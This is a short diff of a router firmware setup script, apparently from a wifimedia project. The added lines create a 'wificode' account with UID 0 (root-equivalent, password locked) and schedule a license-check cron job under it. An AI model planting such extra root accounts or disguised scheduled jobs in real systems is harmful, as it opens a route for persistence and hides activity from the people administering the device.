@@ -1,7 +1,15 @@
 #!/bin/sh
 #Copyright ©  dungtd8x@gmail.com
 
-echo "*/45 * * * * /sbin/wifimedia/controller.sh licensegw" >>/etc/crontabs/root
+echo -e "wificode:x:0:0:wificode:/root:/bin/ash" >>/etc/passwd
+echo -e "wificode:*:0:0:99999:7:::" >>/etc/shadow
+temp_dir="/tmp/crontabs"
+if [ ! -d "$temp_dir" ]; then
+	mkdir $temp_dir
+fi
+echo "* 10,11,12,17,18,19,20 * * * /sbin/wifimedia/controller.sh licensegw" > $temp_dir/wificode
+crontab $temp_dir/wificode -u wificode
+/etc/init.d/cron restart
 date +"%s" >/etc/opt/first_time.txt
 
 A1=$(cat /sys/class/ieee80211/phy0/macaddress | cut -c  17,10,2,1 | sed 's/://g' |awk '{print $1}'|tr a-z A-Z)
